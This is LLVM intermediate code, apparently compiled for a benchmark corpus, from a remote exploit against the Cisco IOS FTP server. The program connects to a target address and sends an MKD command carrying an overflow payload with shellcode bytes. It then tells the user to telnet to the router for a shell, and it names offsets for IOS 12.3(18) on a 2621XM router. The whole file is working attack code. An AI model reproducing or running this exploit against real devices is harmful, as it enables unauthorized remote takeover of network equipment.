; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_6155.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_6155.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.sendbuf = private unnamed_addr constant [87 x i8] c"MKD <\80\81\838\84\DA`}\08Bx|\E4@.\91\07\01t9\08\FF\FF8\E7\09\1A\91\07\04\CA}\03Cx<\80\80\E48\84\08l|\89\03\A6N\80\04 aaaaaaaaaaaaaaaaaaaaaaaa\80\06#\B8\0D\0A\00", align 16
@.str = private unnamed_addr constant [57 x i8] c"\0ACisco IOS FTP server remote exploit by Andy Davis 2008\0A\00", align 1
@.str.1 = private unnamed_addr constant [32 x i8] c"\0AUsage: %s <target IP address>\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@PORT = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [55 x i8] c"Specific offsets for IOS 12.3(18) on a 2621XM router\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [21 x i8] c"Sending exploit...\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [34 x i8] c"Error sending packet...quitting\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [42 x i8] c"Now telnet to the router for a shell...\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca [87 x i8], align 16
  %6 = alloca [256 x i8], align 16
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %9 = bitcast [87 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %9, i8* align 16 getelementptr inbounds ([87 x i8], [87 x i8]* @__const.main.sendbuf, i32 0, i32 0), i64 87, i1 false)
  %10 = load i32, i32* %3, align 4
  %11 = icmp ne i32 %10, 2
  br i1 %11, label %12, label %19

12:                                               ; preds = %2
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str, i64 0, i64 0))
  %14 = load i8**, i8*** %4, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 0
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0), i8* %16)
  %18 = call i32 @exit(i32 -1) #4
  unreachable

19:                                               ; preds = %2
  %20 = load i32, i32* @AF_INET, align 4
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %20, i32* %21, align 4
  %22 = load i8**, i8*** %4, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 1
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @inet_addr(i8* %24)
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  %27 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %26, i32 0, i32 0
  store i32 %25, i32* %27, align 4
  %28 = load i32, i32* @PORT, align 4
  %29 = call i32 @htons(i32 %28)
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i32 %29, i32* %30, align 4
  %31 = load i32, i32* @AF_INET, align 4
  %32 = load i32, i32* @SOCK_STREAM, align 4
  %33 = call i32 @socket(i32 %31, i32 %32, i32 0)
  store i32 %33, i32* %8, align 4
  %34 = load i32, i32* %8, align 4
  %35 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %36 = call i32 @connect(i32 %34, %struct.sockaddr* %35, i32 12)
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str, i64 0, i64 0))
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.2, i64 0, i64 0))
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0))
  %40 = load i32, i32* %8, align 4
  %41 = getelementptr inbounds [87 x i8], [87 x i8]* %5, i64 0, i64 0
  %42 = call i64 @send(i32 %40, i8* %41, i32 86, i32 0)
  %43 = icmp eq i64 %42, 0
  br i1 %43, label %44, label %47

44:                                               ; preds = %19
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.4, i64 0, i64 0))
  %46 = call i32 @exit(i32 1) #4
  unreachable

47:                                               ; preds = %19
  %48 = load i32, i32* %8, align 4
  %49 = getelementptr inbounds [256 x i8], [256 x i8]* %6, i64 0, i64 0
  %50 = call i32 @recv(i32 %48, i8* %49, i32 255, i32 0)
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.5, i64 0, i64 0))
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i64 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
